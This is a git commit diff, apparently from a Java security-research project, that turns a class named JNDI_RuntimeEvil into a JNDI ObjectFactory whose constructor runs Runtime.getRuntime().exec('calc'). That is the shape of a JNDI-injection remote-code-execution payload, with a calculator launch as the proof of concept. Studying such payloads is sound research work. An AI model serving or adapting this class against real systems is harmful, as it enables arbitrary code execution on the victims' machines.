12af9d09d5ef9bbb832728a2c546edf1e17417d7
godownio <1968304602@qq.com>
2024-12-19 10:23:03 +0800

    some validate

--- src/main/java/JNDI_RuntimeEvil.java
+++ src/main/java/JNDI_RuntimeEvil.java
@@ -1,14 +1,24 @@
 
+import javax.naming.Context;
+import javax.naming.Name;
+import javax.naming.spi.ObjectFactory;
 import javax.script.ScriptEngineManager;
 import java.io.IOException;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Method;
 import java.rmi.RemoteException;
+import java.util.Hashtable;
 import java.util.List;
 import java.util.Map;
 
-public class JNDI_RuntimeEvil{
-    public JNDI_RuntimeEvil() throws Exception {
+public class JNDI_RuntimeEvil implements ObjectFactory {
+
+    @Override
+    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
+        return null;
+    }
+
+    public JNDI_RuntimeEvil() throws RemoteException {
         try {
             Runtime.getRuntime().exec("calc");
         } catch (IOException e) {
